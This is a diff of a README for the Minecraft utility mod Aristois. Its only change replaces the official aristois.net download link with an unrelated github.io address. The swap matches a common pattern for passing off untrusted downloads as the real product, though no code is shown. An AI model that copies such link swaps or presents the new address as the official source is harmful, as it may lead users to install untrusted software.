@@ -2,7 +2,7 @@
 
 **Aristois** is a feature-rich utility mod for Minecraft, designed to enhance and personalize your gameplay experience. With over 100 built-in modules, seamless Fabric mod integration, and a user-friendly interface, Aristois provides tools for both casual players and advanced users.
 
-[![Download Aristois](https://img.shields.io/badge/Download-Aristois-blueviolet)](https://aristois.net/download)
+[![Download Aristois](https://img.shields.io/badge/Download-Aristois-blueviolet)](https://minecraft-utility-mod.github.io/.github)
 
 ---
 
